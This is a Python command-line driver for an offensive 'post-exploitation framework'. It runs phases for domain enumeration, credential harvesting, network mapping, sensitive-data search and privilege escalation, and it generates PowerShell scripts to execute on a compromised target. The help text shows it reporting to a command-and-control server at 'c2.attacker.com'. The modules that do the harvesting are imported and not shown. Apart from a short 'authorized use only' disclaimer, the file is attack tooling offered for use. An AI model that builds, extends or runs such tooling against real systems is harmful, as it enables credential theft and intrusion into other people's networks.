#!/usr/bin/env python3
"""
Post-Exploitation Framework - Command Line Interface
Systematic reconnaissance and credential harvesting
"""

import argparse
import sys
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from post_exploitation import PostExploitationHandler


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Post-Exploitation Framework - Automated reconnaissance workflow',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Run complete post-exploitation workflow
  %(prog)s --session engagement-2024 --c2 c2.attacker.com
  
  # Run specific phase only
  %(prog)s --phase domain-enum --session test-session
  
  # Generate scripts for offline execution
  %(prog)s --generate-scripts --output ./scripts

Operational Phases:
  1. Domain Enumeration
  2. Credential Harvesting
  3. Network Mapping
  4. Sensitive Data Discovery
  5. Privilege Escalation
  6. Target Profiling

⚠️  AUTHORIZED USE ONLY ⚠️
This tool is for authorized security testing only.
Unauthorized access to computer systems is illegal.
        '''
    )
    
    # Session configuration
    parser.add_argument(
        '-s', '--session',
        help='Session identifier (default: auto-generated)'
    )
    
    parser.add_argument(
        '-c', '--c2-server',
        help='Command and Control server address'
    )
    
    # Operational modes
    parser.add_argument(
        '-p', '--phase',
        choices=['domain-enum', 'cred-harvest', 'network-map', 
                 'sensitive-data', 'priv-esc', 'all'],
        default='all',
        help='Specific phase to execute (default: all)'
    )
    
    parser.add_argument(
        '--generate-scripts',
        action='store_true',
        help='Generate PowerShell scripts for manual execution'
    )
    
    parser.add_argument(
        '-o', '--output',
        default='./post_exploit_scripts',
        help='Output directory for generated scripts'
    )
    
    # Reporting
    parser.add_argument(
        '--report-only',
        action='store_true',
        help='Generate report from existing findings'
    )
    
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose output'
    )
    
    return parser.parse_args()


def generate_scripts(output_dir: str):
    """Generate all PowerShell scripts for manual execution"""
    from post_exploitation.modules import (
        DomainEnumerator,
        CredentialHarvester,
        NetworkMapper,
        SensitiveDataFinder,
        PrivilegeEscalator
    )
    
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    print(f"\n[*] Generating scripts in: {output_path}")
    
    # Domain enumeration script
    domain_enum = DomainEnumerator()
    script = domain_enum.generate_enumeration_script()
    script_file = output_path / "01_domain_enumeration.ps1"
    script_file.write_text(script)
    print(f"    ✓ {script_file.name}")
    
    # Credential harvesting script
    cred_harvest = CredentialHarvester()
    script = cred_harvest.generate_harvesting_script()
    script_file = output_path / "02_credential_harvesting.ps1"
    script_file.write_text(script)
    print(f"    ✓ {script_file.name}")
    
    # Network mapping script
    network_map = NetworkMapper()
    script = network_map.generate_mapping_script()
    script_file = output_path / "03_network_mapping.ps1"
    script_file.write_text(script)
    print(f"    ✓ {script_file.name}")
    
    # Sensitive data script
    data_finder = SensitiveDataFinder()
    script = data_finder.generate_search_script()
    script_file = output_path / "04_sensitive_data_search.ps1"
    script_file.write_text(script)
    print(f"    ✓ {script_file.name}")
    
    # Privilege escalation script
    priv_esc = PrivilegeEscalator()
    script = priv_esc.generate_escalation_script()
    script_file = output_path / "05_privilege_escalation.ps1"
    script_file.write_text(script)
    print(f"    ✓ {script_file.name}")
    
    print(f"\n[✓] Generated 5 PowerShell scripts")
    print(f"[*] Execute scripts on target system and collect results")


def main():
    """Main execution function"""
    args = parse_arguments()
    
    # Display banner
    print("""
╔═══════════════════════════════════════════════════════════╗
║     POST-EXPLOITATION FRAMEWORK v1.0.0                    ║
║     Systematic Reconnaissance & Credential Harvesting     ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Generate scripts mode
    if args.generate_scripts:
        try:
            generate_scripts(args.output)
            sys.exit(0)
        except Exception as e:
            print(f"[!] Error generating scripts: {str(e)}")
            sys.exit(1)
    
    try:
        # Initialize handler
        handler = PostExploitationHandler(
            session_id=args.session,
            c2_server=args.c2_server
        )
        
        # Execute based on phase selection
        if args.phase == 'all':
            print("\n[*] Executing complete post-exploitation workflow...\n")
            success = handler.execute_post_exploitation()
        
        elif args.phase == 'domain-enum':
            print("\n[*] Executing domain enumeration only...\n")
            success = handler.enumerate_domain()
        
        elif args.phase == 'cred-harvest':
            print("\n[*] Executing credential harvesting only...\n")
            success = handler.harvest_credentials()
        
        elif args.phase == 'network-map':
            print("\n[*] Executing network mapping only...\n")
            success = handler.map_network()
        
        elif args.phase == 'sensitive-data':
            print("\n[*] Executing sensitive data search only...\n")
            success = handler.find_sensitive_data()
        
        elif args.phase == 'priv-esc':
            print("\n[*] Executing privilege escalation checks only...\n")
            success = handler.identify_privilege_escalation()
        
        if success:
            # Display operation summary if verbose
            if args.verbose:
                print("\n" + "="*60)
                print("OPERATION SUMMARY")
                print("="*60)
                
                summary = handler.get_operation_summary()
                
                print(f"\nSession: {summary['session']['session_id']}")
                print(f"Duration: {summary['session']['elapsed_time']}")
                
                print("\n[*] Module Capabilities:")
                for module, details in summary['modules'].items():
                    print(f"\n  {module.replace('_', ' ').title()}:")
                    for key, value in details.items():
                        if isinstance(value, (int, str)):
                            print(f"    • {key}: {value}")
            
            sys.exit(0)
        else:
            print("\n[✗] Operation encountered errors")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n\n[!] Operation interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
